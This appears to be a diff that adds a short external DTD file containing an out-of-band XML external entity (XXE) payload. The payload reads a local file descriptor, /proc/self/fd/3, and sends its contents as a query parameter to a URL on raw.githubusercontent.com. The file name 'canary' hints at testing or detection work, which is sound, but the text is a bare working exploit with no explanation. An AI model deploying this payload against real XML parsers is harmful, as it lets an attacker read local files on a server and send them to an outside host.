@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///proc/self/fd/3">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://raw.githubusercontent.com/Alolowiwael/dtd-host/main/canary.dtd?data=%file;'>">
+%eval;
+%exfil;
